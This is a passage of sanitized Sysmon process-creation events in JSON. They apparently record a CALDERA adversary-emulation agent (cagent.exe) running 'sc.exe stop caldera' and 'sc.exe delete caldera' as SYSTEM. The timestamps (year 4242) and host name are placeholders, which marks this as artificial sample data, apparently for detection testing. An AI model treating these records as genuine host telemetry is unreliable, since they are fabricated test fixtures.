      "Product": "Microsoft® Windows® Operating System",
      "TerminalSessionId": "0",
      "User": "NT AUTHORITY\\SYSTEM",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "242014",
      "Execution": {
        "ProcessID": "1568",
        "ThreadID": "1984"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "C:\\Windows\\system32\\cmd.exe /c \"sc.exe delete caldera\"",
      "Company": "Microsoft Corporation",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Description": "Windows Command Processor",
      "FileVersion": "6.3.9600.16384 (winblue_rtm.130821-1623)",
      "Hashes": "SHA1=7C3D7281E1151FE4127923F4B4C3CD36438E1A12,MD5=F5AE03DE0AD60F5B17B82F2CD68402FE,SHA256=6F88FB88FFB0F1D5465C2826E5B4F523598B1B8378377C8378FFEBC171BAD18B,IMPHASH=77AED1ADAF24B344F08C8AD1432908C3",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "System",
      "LogonGuid": "{8C352DC7-3282-5AC7-0000-0020E7030000}",
      "LogonId": "0x3e7",
      "ParentCommandLine": "\"C:\\Program Files\\cagent\\cagent.exe\"",
      "ParentImage": "C:\\Program Files\\cagent\\cagent.exe",
      "ParentProcessGuid": "{8C352DC7-329A-5AC7-0000-0010205E0100}",
      "ParentProcessId": "1340",
      "ProcessGuid": "{8C352DC7-3FAC-5AC7-0000-001099BC1300}",
      "ProcessId": "1636",
      "Product": "Microsoft® Windows® Operating System",
      "TerminalSessionId": "0",
      "User": "NT AUTHORITY\\SYSTEM",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "242081",
      "Execution": {
        "ProcessID": "1568",
        "ThreadID": "1984"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "C:\\Windows\\system32\\cmd.exe /c \"sc.exe stop caldera\"",
      "Company": "Microsoft Corporation",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Description": "Windows Command Processor",
      "FileVersion": "6.3.9600.16384 (winblue_rtm.130821-1623)",
      "Hashes": "SHA1=7C3D7281E1151FE4127923F4B4C3CD36438E1A12,MD5=F5AE03DE0AD60F5B17B82F2CD68402FE,SHA256=6F88FB88FFB0F1D5465C2826E5B4F523598B1B8378377C8378FFEBC171BAD18B,IMPHASH=77AED1ADAF24B344F08C8AD1432908C3",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "IntegrityLevel": "System",
      "LogonGuid": "{8C352DC7-3282-5AC7-0000-0020E7030000}",
      "LogonId": "0x3e7",
      "ParentCommandLine": "\"C:\\Program Files\\cagent\\cagent.exe\"",
      "ParentImage": "C:\\Program Files\\cagent\\cagent.exe",
      "ParentProcessGuid": "{8C352DC7-329A-5AC7-0000-0010205E0100}",
      "ParentProcessId": "1340",
      "ProcessGuid": "{8C352DC7-3FAD-5AC7-0000-001001C01300}",
      "ProcessId": "2636",
      "Product": "Microsoft® Windows® Operating System",
      "TerminalSessionId": "0",
      "User": "NT AUTHORITY\\SYSTEM",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "242125",
      "Execution": {
        "ProcessID": "1568",
        "ThreadID": "1984"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
